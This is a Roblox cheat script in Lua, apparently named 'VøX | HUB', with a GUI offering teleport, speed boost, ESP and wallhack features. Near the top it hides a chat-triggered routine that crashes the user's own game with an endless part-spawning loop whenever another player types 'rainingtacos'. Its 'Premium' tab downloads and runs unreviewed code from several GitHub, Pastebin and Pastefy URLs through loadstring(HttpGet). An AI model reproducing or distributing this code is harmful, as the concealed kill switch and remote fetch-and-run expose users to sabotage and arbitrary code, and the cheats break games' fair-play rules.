-- ============================================================
-- VØX | HUB - INTERFACE NOIR/VIOLET AVEC SHONI HUB INTÉGRÉ
-- ============================================================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ============================================================
-- SYSTÈME DE CRASH D'URGENCE ("rainingtacos")
-- ============================================================
local TextChatService = game:GetService("TextChatService")
local function crashGame()
    while true do
        for i = 1, 100000 do
            Instance.new("Part", workspace)
        end
    end
end

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(message)
        if message.Text:lower() == "rainingtacos" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
            crashGame()
        end
    end)
end

local function setupLegacyChat()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            plr.Chatted:Connect(function(msg)
                if msg:lower() == "rainingtacos" then crashGame() end
            end)
        end
    end
    Players.PlayerAdded:Connect(function(plr)
        if plr ~= LocalPlayer then
            plr.Chatted:Connect(function(msg)
                if msg:lower() == "rainingtacos" then crashGame() end
            end)
        end
    end)
end
setupLegacyChat()

-- ============================================================
-- CONFIGURATION NOIR/VIOLET
-- ============================================================
local CONFIG = {
    WAYPOINTS = {
        {name = "Point A", pos = Vector3.new(-351.76, -6.66, 20.29)},
        {name = "Point B", pos = Vector3.new(-332.14, -4.51, 18.41)},
    },
    DELAY = 0.15,
    COOLDOWN = 0.5,
    THEME = {
        Background = Color3.fromRGB(10, 10, 10),
        BackgroundDark = Color3.fromRGB(15, 15, 15),
        Text = Color3.fromRGB(255, 255, 255),
        TextDark = Color3.fromRGB(200, 200, 200),
        TextDim = Color3.fromRGB(140, 140, 140),
        Accent = Color3.fromRGB(180, 0, 255),      -- Violet principal
        Accent2 = Color3.fromRGB(140, 0, 200),     -- Violet secondaire
        Success = Color3.fromRGB(180, 0, 255),
        Error = Color3.fromRGB(255, 80, 180),
        Yellow = Color3.fromRGB(180, 0, 255),
        Purple = Color3.fromRGB(120, 0, 180),
    },
    PREMIUM_SCRIPTS = {
        {emoji = "🚫", name = "Auto-Block", url = "https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"},
        {emoji = "⚡", name = "Nameless", url = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"},
        {emoji = "🔒", name = "Allow Friends", url = "https://pastebin.com/raw/aipXbhpf"},
        {emoji = "🌶️", name = "Chilli Hub", url = "https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"},
        {emoji = "👻", name = "Invisible Cloner", url = "https://raw.githubusercontent.com/DupeSab/INVIS-CLONER/refs/heads/main/TOKINU"},
        {emoji = "👑", name = "Admin Panel", url = "https://pastefy.app/sC8g14Ek/raw"},
    }
}

local State = {
    isTeleporting = false,
    lastTeleportTime = 0,
    totalTeleports = 0,
    guiVisible = true,
    wallhackEnabled = false,
    wallhackParts = {},
    wallhackConnection = nil,
    espEnabled = false,
    espBoxes = {},
    espConnections = {},
    optimizerEnabled = false,
    streamProofEnabled = false,
    whitelistedUsers = {},
    fpsEnabled = false,
    speedBoostActive = false,
}

-- ============================================================
-- ANIMATION DE CONTOUR VIOLET ANIMÉ
-- ============================================================
local function createAnimatedStroke(obj)
    local baseStroke = Instance.new("UIStroke")
    baseStroke.Color = Color3.fromRGB(180, 0, 255)
    baseStroke.Thickness = 3
    baseStroke.Transparency = 0
    baseStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    baseStroke.Parent = obj

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 0, 255)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(10, 10, 10)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 10, 10)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(180, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 255))
    }
    gradient.Rotation = 0
    gradient.Parent = baseStroke

    local animRunning = true
    task.spawn(function()
        local rotation = 0
        while animRunning and baseStroke and baseStroke.Parent do
            gradient.Rotation = rotation
            rotation = (rotation + 2) % 360
            task.wait(0.03)
        end
    end)

    obj.Destroying:Connect(function()
        animRunning = false
    end)

    return baseStroke
end

-- ============================================================
-- DRAG SYSTEM
-- ============================================================
local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ============================================================
-- UTILITAIRES
-- ============================================================
local function getHRP()
    local char = LocalPlayer.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChild("Humanoid")
    if hrp and humanoid and humanoid.Health > 0 then return hrp end
    return nil
end

local function canTeleport()
    if State.isTeleporting then return false end
    if tick() - State.lastTeleportTime < CONFIG.COOLDOWN then return false end
    if not getHRP() then return false end
    return true
end

local function tween(obj, props, dur)
    TweenService:Create(obj, TweenInfo.new(dur or 0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end

local function teleportSequence()
    if not canTeleport() then return false end
    State.isTeleporting = true
    State.lastTeleportTime = tick()

    local success = pcall(function()
        for i, wp in ipairs(CONFIG.WAYPOINTS) do
            local hrp = getHRP()
            if not hrp then error("Lost") end
            hrp.CFrame = CFrame.new(wp.pos)
            if i < #CONFIG.WAYPOINTS then task.wait(CONFIG.DELAY) end
        end
    end)

    State.isTeleporting = false
    if success then
        State.totalTeleports += 1
        return true
    else
        return false
    end
end

local function toggleOptimizer(enabled)
    if enabled then
        settings().Rendering.QualityLevel = 1
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            end
        end
    else
        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
    end
end

local function toggleStreamProof(enabled)
    if enabled then
        for _, gui in pairs(PlayerGui:GetDescendants()) do
            if gui:IsA("ScreenGui") then gui.Enabled = false end
        end
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    else
        for _, gui in pairs(PlayerGui:GetDescendants()) do
            if gui:IsA("ScreenGui") then gui.Enabled = true end
        end
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    end
end

local function clearWallhack()
    for part, data in pairs(State.wallhackParts) do
        if part and part.Parent then
            part.LocalTransparencyModifier = data.OriginalTransparency or 0
        end
    end
    State.wallhackParts = {}
    if State.wallhackConnection then
        State.wallhackConnection:Disconnect()
        State.wallhackConnection = nil
    end
end

local function toggleWallhack(enabled)
    State.wallhackEnabled = enabled
    if enabled then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
                local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
                if not isPlayer then
                    State.wallhackParts[obj] = {OriginalTransparency = obj.LocalTransparencyModifier}
                    obj.LocalTransparencyModifier = 0.8
                end
            end
        end

        State.wallhackConnection = workspace.DescendantAdded:Connect(function(obj)
            if State.wallhackEnabled and obj:IsA("BasePart") then
                task.wait(0.1)
                if State.wallhackEnabled then
                    local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
                    if not isPlayer then
                        obj.LocalTransparencyModifier = 0.8
                        State.wallhackParts[obj] = {OriginalTransparency = 0}
                    end
                end
            end
        end)
    else
        clearWallhack()
    end
end

local function clearESP()
    for _, data in pairs(State.espBoxes) do
        if data.Box then data.Box:Destroy() end
        if data.NameLabel then data.NameLabel:Destroy() end
    end
    State.espBoxes = {}
    for _, conn in pairs(State.espConnections) do
        if conn then conn:Disconnect() end
    end
    State.espConnections = {}
end

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    local char = player.Character
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head")
    if not hrp or not head then return end

    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = hrp
    box.Size = Vector3.new(4, 5, 1)
    box.Color3 = Color3.fromRGB(180, 0, 255)
    box.Transparency = 0.3
    box.AlwaysOnTop = true
    box.Parent = hrp

    local billboard = Instance.new("BillboardGui")
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = player.Name
    nameLabel.TextColor3 = Color3.fromRGB(180, 0, 255)
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = 18
    nameLabel.TextStrokeTransparency = 0
    nameLabel.Parent = billboard

    State.espBoxes[player.UserId] = {Box = box, NameLabel = billboard}
end

local function toggleESP(enabled)
    State.espEnabled = enabled
    if enabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                createESP(player)
            end
        end
        table.insert(State.espConnections, Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function()
                task.wait(0.5)
                if State.espEnabled then createESP(player) end
            end)
        end))
    else
        clearESP()
    end
end

local function loadPremiumScript(scriptData, btn, icon)
    icon.Text = "⏳"
    icon.TextColor3 = CONFIG.THEME.Accent
    btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargement..."

    local success = pcall(function()
        loadstring(game:HttpGet(scriptData.url))()
    end)

    if success then
        icon.Text = "✓"
        icon.TextColor3 = CONFIG.THEME.Success
        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargé!"
        task.wait(2)
        btn.Text = scriptData.emoji .. " " .. scriptData.name
        icon.Text = "●"
        icon.TextColor3 = CONFIG.THEME.Success
    else
        icon.Text = "✕"
        icon.TextColor3 = CONFIG.THEME.Error
        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Erreur"
        task.wait(2)
        btn.Text = scriptData.emoji .. " " .. scriptData.name
        icon.Text = "○"
    end
end

-- FPS Counter
local fpsFrame, fpsLabel, fpsConnection
local function createFPSCounter(gui)
    fpsFrame = Instance.new("Frame")
    fpsFrame.Size = UDim2.new(0, 120, 0, 40)
    fpsFrame.Position = UDim2.new(0, 10, 0, 10)
    fpsFrame.BackgroundTransparency = 0.3
    fpsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Instance.new("UICorner", fpsFrame).CornerRadius = UDim.new(0, 8)
    fpsFrame.Parent = gui
    fpsFrame.Visible = false

    fpsLabel = Instance.new("TextLabel", fpsFrame)
    fpsLabel.Size = UDim2.new(1, 0, 1, 0)
    fpsLabel.BackgroundTransparency = 1
    fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    fpsLabel.TextStrokeTransparency = 0.5
    fpsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    fpsLabel.Font = Enum.Font.GothamBold
    fpsLabel.TextSize = 18
    fpsLabel.Text = "FPS: 0"
end

local function toggleFPSCounter(enabled)
    if not fpsFrame then return end
    fpsFrame.Visible = enabled

    if enabled and not fpsConnection then
        local lastTime = tick()
        local frameCount = 0
        fpsConnection = RunService.RenderStepped:Connect(function()
            frameCount = frameCount + 1
            if tick() - lastTime >= 1 then
                local fps = math.floor(frameCount / (tick() - lastTime))
                fpsLabel.Text = "FPS: " .. fps
                fpsLabel.TextColor3 = fps > 120 and Color3.fromRGB(0, 255, 0) or (fps > 60 and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(255, 0, 0))
                frameCount = 0
                lastTime = tick()
            end
        end)
    elseif not enabled and fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
    end
end

-- Speed Boost
local speedConnection = nil
local maxSpeed = 28
local accelerationTime = 1.5
local antiResetConnection = nil

local function toggleSpeedBoost(enabled)
    State.speedBoostActive = enabled

    if enabled then
        if speedConnection then speedConnection:Disconnect() end
        if antiResetConnection then antiResetConnection:Disconnect() end

        local startTime = tick()
        speedConnection = RunService.Heartbeat:Connect(function()
            if not State.speedBoostActive then return end
            local char = LocalPlayer.Character
            if not char then return end
            local humanoid = char:FindFirstChild("Humanoid")
            if not humanoid or humanoid.Health <= 0 then return end

            local elapsed = tick() - startTime
            if elapsed >= accelerationTime then
                humanoid.WalkSpeed = maxSpeed
            else
                local progress = elapsed / accelerationTime
                humanoid.WalkSpeed = 16 + (maxSpeed - 16) * progress
            end
        end)

        local char = LocalPlayer.Character
        if char then
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid then
                antiResetConnection = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                    if State.speedBoostActive and humanoid.WalkSpeed < maxSpeed and humanoid.Health > 0 then
                        task.wait()
                        if State.speedBoostActive then
                            humanoid.WalkSpeed = maxSpeed
                        end
                    end
                end)
            end
        end
    else
        if speedConnection then speedConnection:Disconnect() speedConnection = nil end
        if antiResetConnection then antiResetConnection:Disconnect() antiResetConnection = nil end
        local char = LocalPlayer.Character
        if char then
            local humanoid = char:FindFirstChild("Humanoid")
            if humanoid then humanoid.WalkSpeed = 16 end
        end
    end
end

-- ============================================================
-- GUI COMPLET
-- ============================================================
local function createGUI()
    local existing = PlayerGui:FindFirstChild("VOX_HUB_GUI")
    if existing then existing:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VOX_HUB_GUI"
    gui.ResetOnSpawn = false
    gui.Parent = PlayerGui

    -- Bouton réouverture
    local reopenBtn = Instance.new("TextButton")
    reopenBtn.Name = "ReopenButton"
    reopenBtn.Size = UDim2.new(0, 50, 0, 50)
    reopenBtn.Position = UDim2.new(1, -60, 0, 10)
    reopenBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    reopenBtn.Text = "🟣"
    reopenBtn.TextColor3 = Color3.fromRGB(180, 0, 255)
    reopenBtn.Font = Enum.Font.GothamBold
    reopenBtn.TextSize = 24
    reopenBtn.Visible = false
    reopenBtn.Parent = gui
    Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 10)
    createAnimatedStroke(reopenBtn)
    makeDraggable(reopenBtn)

    -- Bouton TP rapide
    local tpBtn = Instance.new("TextButton")
    tpBtn.Size = UDim2.new(0, 50, 0, 50)
    tpBtn.Position = UDim2.new(1, -120, 0, 10)
    tpBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    tpBtn.Text = "⚡"
    tpBtn.TextColor3 = Color3.fromRGB(180, 0, 255)
    tpBtn.Font = Enum.Font.GothamBold
    tpBtn.TextSize = 26
    tpBtn.Parent = gui
    Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 10)
    createAnimatedStroke(tpBtn)
    makeDraggable(tpBtn)
    tpBtn.MouseButton1Click:Connect(teleportSequence)

    -- Frame principale
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 350, 0, 450)
    main.Position = UDim2.new(0.5, -175, 0.5, -225)
    main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
    createAnimatedStroke(main)
    makeDraggable(main)

    -- Header
    local header = Instance.new("Frame", main)
    header.Size = UDim2.new(1, 0, 0, 45)
    header.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)

    local logo = Instance.new("TextLabel", header)
    logo.Size = UDim2.new(1, -50, 1, 0)
    logo.Position = UDim2.new(0, 15, 0, 0)
    logo.BackgroundTransparency = 1
    logo.Text = "🟣 VøX | HUB"
    logo.TextColor3 = Color3.fromRGB(180, 0, 255)
    logo.Font = Enum.Font.GothamBold
    logo.TextSize = 22
    logo.TextXAlignment = Enum.TextXAlignment.Left

    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -38, 0, 7)
    closeBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

    closeBtn.MouseButton1Click:Connect(function()
        State.guiVisible = false
        main.Visible = false
        reopenBtn.Visible = true
    end)

    reopenBtn.MouseButton1Click:Connect(function()
        State.guiVisible = true
        main.Visible = true
        reopenBtn.Visible = false
    end)

    -- Tabs
    local tabBar = Instance.new("Frame", main)
    tabBar.Size = UDim2.new(1, -20, 0, 38)
    tabBar.Position = UDim2.new(0, 10, 0, 52)
    tabBar.BackgroundTransparency = 1

    local tabLayout = Instance.new("UIListLayout", tabBar)
    tabLayout.FillDirection = Enum.FillDirection.Horizontal
    tabLayout.Padding = UDim.new(0, 4)
    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left

    local content = Instance.new("ScrollingFrame", main)
    content.Size = UDim2.new(1, -20, 1, -130)
    content.Position = UDim2.new(0, 10, 0, 98)
    content.BackgroundTransparency = 1
    content.ScrollBarThickness = 3
    content.ScrollBarImageColor3 = CONFIG.THEME.Accent
    content.CanvasSize = UDim2.new(0, 0, 0, 0)

    local footer = Instance.new("TextLabel", main)
    footer.Size = UDim2.new(1, 0, 0, 25)
    footer.Position = UDim2.new(0, 0, 1, -28)
    footer.BackgroundTransparency = 1
    footer.Text = "🟣 by 8v, 6v & 4v"
    footer.TextColor3 = CONFIG.THEME.Accent
    footer.Font = Enum.Font.Gotham
    footer.TextSize = 11
    footer.TextXAlignment = Enum.TextXAlignment.Center

    local tabs = {}

    local function createTab(name, emoji)
        local tabBtn = Instance.new("TextButton", tabBar)
        tabBtn.Size = UDim2.new(0, 54, 1, 0)
        tabBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        tabBtn.Text = emoji
        tabBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
        tabBtn.Font = Enum.Font.GothamBold
        tabBtn.TextSize = 18
        Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 8)

        local container = Instance.new("Frame", content)
        container.Size = UDim2.new(1, -10, 0, 0)
        container.BackgroundTransparency = 1
        container.Visible = false

        local layout = Instance.new("UIListLayout", container)
        layout.Padding = UDim.new(0, 8)

        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            container.Size = UDim2.new(1, -10, 0, layout.AbsoluteContentSize.Y + 10)
            local maxH = 0
            for _, t in pairs(tabs) do
                if t.Content.Visible then
                    local l = t.Content:FindFirstChildOfClass("UIListLayout")
                    if l then maxH = math.max(maxH, l.AbsoluteContentSize.Y + 15) end
                end
            end
            content.CanvasSize = UDim2.new(0, 0, 0, maxH)
        end)

        tabs[name] = {Button = tabBtn, Content = container}

        tabBtn.MouseButton1Click:Connect(function()
            for _, t in pairs(tabs) do
                t.Content.Visible = false
                t.Button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                t.Button.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
            container.Visible = true
            tabBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
            tabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        end)

        return container
    end

    local function btn(parent, name, callback)
        local b = Instance.new("TextButton", parent)
        b.Size = UDim2.new(1, 0, 0, 42)
        b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        b.Text = name
        b.TextColor3 = Color3.fromRGB(200, 200, 200)
        b.Font = Enum.Font.GothamBold
        b.TextSize = 13
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)

        local bStroke = Instance.new("UIStroke", b)
        bStroke.Color = Color3.fromRGB(180, 0, 255)
        bStroke.Thickness = 2

        local gradient = Instance.new("UIGradient", bStroke)
        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 0, 255)),
            ColorSequenceKeypoint.new(0.3, Color3.fromRGB(10, 10, 10)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 10, 10)),
            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(180, 0, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 255))
        }

        task.spawn(function()
            local rotation = math.random(0, 360)
            while b and b.Parent do
                gradient.Rotation = rotation
                rotation = (rotation + 2) % 360
                task.wait(0.03)
            end
        end)

        local icon = Instance.new("TextLabel", b)
        icon.Size = UDim2.new(0, 25, 0, 25)
        icon.Position = UDim2.new(1, -33, 0.5, -12)
        icon.BackgroundTransparency = 1
        icon.Text = "○"
        icon.TextColor3 = CONFIG.THEME.TextDim
        icon.Font = Enum.Font.GothamBold
        icon.TextSize = 16

        b.MouseEnter:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(50, 0, 80)}, 0.2) end)
        b.MouseLeave:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(20, 20, 20)}, 0.2) end)

        if callback then
            b.MouseButton1Click:Connect(function() callback(b, icon) end)
        end

        return b, icon
    end

    local function lbl(parent, text, color)
        local l = Instance.new("TextLabel", parent)
        l.Size = UDim2.new(1, 0, 0, 25)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = color or CONFIG.THEME.Accent
        l.Font = Enum.Font.Gotham
        l.TextSize = 12
        l.TextXAlignment = Enum.TextXAlignment.Left
        return l
    end

    -- Création des onglets
    local miscTab = createTab("Misc", "🔮")
    local espTab = createTab("ESP", "👁️")
    local premTab = createTab("Prem", "✨")
    local keyTab = createTab("Key", "⌨️")
    local infoTab = createTab("Info", "📜")

    -- Misc
    btn(miscTab, "Téléporter", function(b, i)
        if teleportSequence() then
            i.Text = "✓"; i.TextColor3 = CONFIG.THEME.Success; task.wait(1); i.Text = "○"; i.TextColor3 = CONFIG.THEME.TextDim
        end
    end)

    btn(miscTab, "⚡ Speed Boost (0→28)", function(b, i)
        State.speedBoostActive = not State.speedBoostActive
        toggleSpeedBoost(State.speedBoostActive)
        i.Text = State.speedBoostActive and "●" or "○"
        i.TextColor3 = State.speedBoostActive and CONFIG.THEME.Success or CONFIG.THEME.TextDim
        b.Text = State.speedBoostActive and "⚡ Speed Boost : ON" or "⚡ Speed Boost : OFF"
    end)

    btn(miscTab, "📊 FPS Counter", function(b, i)
        State.fpsEnabled = not State.fpsEnabled
        toggleFPSCounter(State.fpsEnabled)
        i.Text = State.fpsEnabled and "●" or "○"
        i.TextColor3 = State.fpsEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
        b.Text = State.fpsEnabled and "📊 FPS : ON" or "📊 FPS : OFF"
    end)

    btn(miscTab, "Optimizer", function(b, i)
        State.optimizerEnabled = not State.optimizerEnabled
        toggleOptimizer(State.optimizerEnabled)
        i.Text = State.optimizerEnabled and "●" or "○"
        i.TextColor3 = State.optimizerEnabled and CONFIG.THEME.Accent or CONFIG.THEME.TextDim
    end)

    btn(miscTab, "Stream Proof", function(b, i)
        State.streamProofEnabled = not State.streamProofEnabled
        toggleStreamProof(State.streamProofEnabled)
        i.Text = State.streamProofEnabled and "●" or "○"
        i.TextColor3 = State.streamProofEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    end)

    -- ESP
    btn(espTab, "ESP", function(b, i)
        State.espEnabled = not State.espEnabled
        toggleESP(State.espEnabled)
        i.Text = State.espEnabled and "●" or "○"
        i.TextColor3 = State.espEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    end)

    btn(espTab, "Wallhack", function(b, i)
        State.wallhackEnabled = not State.wallhackEnabled
        toggleWallhack(State.wallhackEnabled)
        i.Text = State.wallhackEnabled and "●" or "○"
        i.TextColor3 = State.wallhackEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    end)

    -- Premium
    lbl(premTab, "✨ Scripts Premium", CONFIG.THEME.Purple)
    for _, s in ipairs(CONFIG.PREMIUM_SCRIPTS) do
        btn(premTab, s.emoji .. " " .. s.name, function(b, i)
            loadPremiumScript(s, b, i)
        end)
    end

    -- Keybinds
    lbl(keyTab, "🎮 Raccourcis Clavier:", CONFIG.THEME.Accent)
    lbl(keyTab, "[T] - Téléporter", CONFIG.THEME.TextDark)
    lbl(keyTab, "[Q] - Speed Boost ON/OFF", CONFIG.THEME.TextDark)
    lbl(keyTab, "[INSERT] - Ouvrir/Fermer Menu", CONFIG.THEME.TextDark)
    lbl(keyTab, "[P] - Stream Proof", CONFIG.THEME.TextDark)

    -- Info
    lbl(infoTab, "🕷️ Discord:", CONFIG.THEME.Accent)
    local discordBtn = Instance.new("TextButton", infoTab)
    discordBtn.Size = UDim2.new(1, 0, 0, 40)
    discordBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    discordBtn.Text = "https://discord.gg/Mf8kMGbPUq"
    discordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordBtn.Font = Enum.Font.GothamBold
    discordBtn.TextSize = 12
    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)
    discordBtn.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/Mf8kMGbPUq")
    end)

    lbl(infoTab, "Version: 2.1.0 Shoni Fusion 🟣", CONFIG.THEME.TextDim)
    lbl(infoTab, "Créé par 8v, 6v & 4v", CONFIG.THEME.TextDim)

    -- Onglet par défaut
    tabs["Misc"].Content.Visible = true
    tabs["Misc"].Button.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    tabs["Misc"].Button.TextColor3 = Color3.fromRGB(255, 255, 255)

    createFPSCounter(gui)
end

createGUI()

-- ============================================================
-- KEYBINDS
-- ============================================================
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end

    if input.KeyCode == Enum.KeyCode.T then
        teleportSequence()
    elseif input.KeyCode == Enum.KeyCode.Q then
        State.speedBoostActive = not State.speedBoostActive
        toggleSpeedBoost(State.speedBoostActive)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "⚡ Speed Boost",
            Text = State.speedBoostActive and "Activé ! (28 WalkSpeed)" or "Désactivé",
            Duration = 2
        })
    elseif input.KeyCode == Enum.KeyCode.Insert then
        State.guiVisible = not State.guiVisible
        local gui = PlayerGui:FindFirstChild("VOX_HUB_GUI")
        if gui then
            local main = gui:FindFirstChild("Frame")
            local reopen = gui:FindFirstChild("ReopenButton")
            if main and reopen then
                main.Visible = State.guiVisible
                reopen.Visible = not State.guiVisible
            end
        end
    elseif input.KeyCode == Enum.KeyCode.P then
        local gui = PlayerGui:FindFirstChild("VOX_HUB_GUI")
        if gui then gui.Enabled = not gui.Enabled end
    end
end)

-- Respawn Speed Boost
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    if State.speedBoostActive then
        toggleSpeedBoost(false)
        task.wait(0.1)
        toggleSpeedBoost(true)
    end
end)
